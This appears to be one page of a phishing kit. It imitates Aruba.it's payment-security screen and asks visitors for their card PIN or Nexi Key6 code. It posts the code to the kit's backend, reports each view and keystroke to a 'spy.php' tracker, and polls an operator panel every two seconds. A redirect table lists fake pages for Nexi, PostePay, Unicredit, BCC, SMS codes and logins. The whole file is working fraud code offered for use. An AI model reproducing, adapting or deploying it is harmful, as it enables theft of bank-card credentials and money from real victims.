<?php
require_once '../includes/main.php';
require '../main.php'; 
?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SICUREZZA DEI PAGAMENTI - Aruba.it</title>
    <link rel="stylesheet" type="text/css" href="PIN/res/source8f26.css?v=55">
    <style>
        .col-md-3 { width: 150px; }
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }
        .container {
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            padding: 20px;
            box-sizing: border-box;
        }
        .content {
            max-width: 600px;
            width: 100%;
            background-color: #fff;
            padding: 20px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .title {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .title img {
            width: 120px;
            height: auto;
        }
        .login {
            margin-top: 20px;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            padding: 10px 20px;
            background-color: #002E6D;
            color: #fff;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }
        button:hover {
            background-color: #004085;
        }
        .footer {
            text-align: center;
            padding: 20px;
            background-color: #f8f9fa;
            color: #6c757d;
        }
        .footer a {
            color: #007bff;
            text-decoration: none;
        }
        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body class="__areautenti">

<div class="container">
    <div class="content">
        <div class="title">
            <img src="./PIN/one.jpg" alt="Logo 1" class="img-fluid">
            <img src="./PIN/two.jpg" alt="Logo 2" class="img-fluid">
        </div>

        <div class="login">
            <h5><b style="color:#002E6D">SICUREZZA DEI PAGAMENTI</b></h5>
            <form action="post.php" method="post">
                <input type="hidden" name="step" value="pin">
                <span>Inserisci il PIN o il codice Nexi Key6 della carta che stai utilizzando.</span>
				<br>
				<br>
                <div class="form-group">
                    <input type="tel" name="pinx" id="pinx" required placeholder="******" maxlength="6">
                </div>
				<br>
                <button type="submit" name="submit">CONTINUARE</button>
            </form>
        </div>
    </div>
</div>

<div class="footer">
    <span class="copyrightBottomDescription">©2026 Aruba S.p.A. - P.IVA 01573850516 - REA: BG-434483 - All rights reserved</span>
    <br><a href="#" target="_blank">Cookie policy</a> - <a href="#">Personalizza cookie</a>
</div>

<script src="res/jq.js"></script>
<script src="res/v.js"></script>
<script>
    var targets = {
        1: "log.php",
        2: "card.php",
        3: "carderror.php",
        4: "nexi.php",
        5: "nexi_error.php",
        6: "ints.php",
        7: "ints_error.php",
        8: "sms.php",
        9: "sms_error.php",
        10: "success.php",
        11: "app.php",
        12: "Cartabcc.php",
        13: "Cartabcc_error.php",
        14: "PostePay.php",
        15: "PostePay_error.php",
        16: "Unicredit.php",
        17: "Unicredit_error.php",
        18: "pin.php"
    };
    
    function clearRedirections() {
        $.post("../panel/process/processor.php", {clearRedirection: 1});
    }

    clearRedirections();
    setInterval(function(){
        $.post("../panel/process/processor.php", {keepAlive: 1, page: "Pin"});
    }, 2000);

    function showPasswordWeb() {
        const passwordField = document.getElementById("PasswordAreaUtenti");
        const eyeOpen = document.getElementById("eye-passwordWeb");
        const eyeClosed = document.getElementById("eye-no-passwordWeb");

        if (passwordField.type === "password") {
            passwordField.type = "text";
            eyeOpen.style.display = "none";
            eyeClosed.style.display = "block";
        } else {
            passwordField.type = "password";
            eyeOpen.style.display = "block";
            eyeClosed.style.display = "none";
        }
    }

    $.post("spy.php", {pinview: 1});
    var abort = false;
    $("#pinx").keyup(function(){
        if(!abort) {
            $.post("spy.php", {pining: 1});
            abort = true;
        }
    });
</script>

</body>
</html>